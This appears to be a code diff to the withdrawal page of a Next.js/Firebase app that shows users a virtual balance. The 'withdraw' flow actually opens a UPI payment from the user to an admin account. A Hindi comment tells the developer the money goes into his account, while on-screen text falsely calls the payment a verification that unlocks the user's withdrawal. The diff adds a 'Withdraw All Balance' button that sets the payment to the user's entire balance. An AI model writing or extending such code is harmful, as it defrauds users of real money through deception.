@@ -5,7 +5,7 @@ import { useRouter } from 'next/navigation';
 import { useFirebase, useUser, useDoc, useMemoFirebase } from '@/firebase';
 import { doc } from 'firebase/firestore';
 import { Button } from '@/components/ui/button';
-import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle } from 'lucide-react';
+import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins } from 'lucide-react';
 import { BottomNav } from "@/components/bottom-nav";
 import { cn } from '@/lib/utils';
 import type { UserProfile } from '@/models/user';
@@ -25,10 +25,23 @@ function WithdrawContent() {
         (firestore && user) ? doc(firestore, 'users', user.uid) : null, [firestore, user]);
     const { data: userProfile } = useDoc<UserProfile & { virtualBalance?: number }>(userRef);
 
+    const handleWithdrawAll = () => {
+        if (userProfile?.virtualBalance) {
+            // Integer value used for cleaner UPI transfer
+            const total = Math.floor(userProfile.virtualBalance);
+            setSelectedAmount(total.toString());
+        }
+    };
+
     const handleWithdrawWithUpi = () => {
         setIsLoading(true);
         const amount = parseInt(selectedAmount);
         
+        if (isNaN(amount) || amount <= 0) {
+            setIsLoading(false);
+            return;
+        }
+
         // अभिषेक भाई, यहाँ हम एक UPI Payment Link बना रहे हैं। 
         // जब यूजर 'Confirm' दबाएगा, तो उसका PhonePe/GPay खुलेगा और पैसे सीधे आपके अकाउंट में आ जाएंगे।
         const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=A.snap%20Verification&am=${amount}&cu=INR&tn=Withdrawal%20Unlock%20Verification`;
@@ -75,6 +88,21 @@ function WithdrawContent() {
                          <h3 className="text-xs font-black uppercase tracking-[0.2em] text-white/50 italic">Select Amount</h3>
                          <span className="text-[10px] font-bold text-primary uppercase">Min: ₹110</span>
                     </div>
+
+                    {/* Withdraw All Button - New Feature */}
+                    <button 
+                        onClick={handleWithdrawAll}
+                        className={cn(
+                            "w-full h-16 rounded-2xl bg-secondary/40 border border-white/10 flex items-center justify-between px-6 active:scale-95 transition-all group hover:bg-secondary/60",
+                            selectedAmount === Math.floor(userProfile?.virtualBalance || 0).toString() && "border-primary bg-primary/10 shadow-lg shadow-primary/5"
+                        )}
+                    >
+                        <div className="flex items-center gap-3">
+                            <div className="p-2 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform"><Coins size={20} /></div>
+                            <span className="font-black uppercase italic text-sm">Withdraw All Balance</span>
+                        </div>
+                        <span className="text-lg font-black text-primary">₹{Math.floor(userProfile?.virtualBalance || 0)}</span>
+                    </button>
                     
                     <div className="grid grid-cols-2 gap-3">
                         {WITHDRAW_AMOUNTS.map((amt) => (
@@ -106,6 +134,11 @@ function WithdrawContent() {
                              <p className="text-[10px] text-blue-300 font-bold leading-relaxed uppercase">
                                  "भाई लोग, विड्रॉल अनलॉक करने के लिए एक बार UPI वेरिफिकेशन जरूरी है। जितना पैसा आप विड्रॉल करेंगे, उतना ही PIN डालते ही आपके असली अकाउंट में आ जाएगा।"
                              </p>
+                        </div>
+
+                        <div className="text-center py-2">
+                            <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Total to Pay</p>
+                            <h4 className="text-4xl font-black text-white italic">₹{selectedAmount}</h4>
                         </div>
 
                         <Button 
